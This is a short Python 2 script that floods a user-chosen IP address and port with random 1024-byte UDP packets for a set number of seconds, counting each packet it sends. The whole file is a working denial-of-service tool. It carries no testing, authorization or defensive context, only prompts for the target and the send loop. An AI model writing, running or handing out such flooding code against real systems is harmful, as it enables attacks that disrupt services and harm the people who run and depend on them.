import socket
import random
import time

#Open a new socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#Create packets
bytes = random._urandom(1024)

#Take inputs from user
ip = raw_input('Target IP address:')
port = input('Port: ')
duration = input('Number of seconds to send packets ')

#set timeout
timeout = time.time() + duration
sent = 0

while True:
    if time.time() > timeout:
        break
    else:
        pass
    sock.sendto(bytes,(ip,port))
    sent = sent + 1
    print "Sent %s packet to %s through port %s"%(sent,ip,port)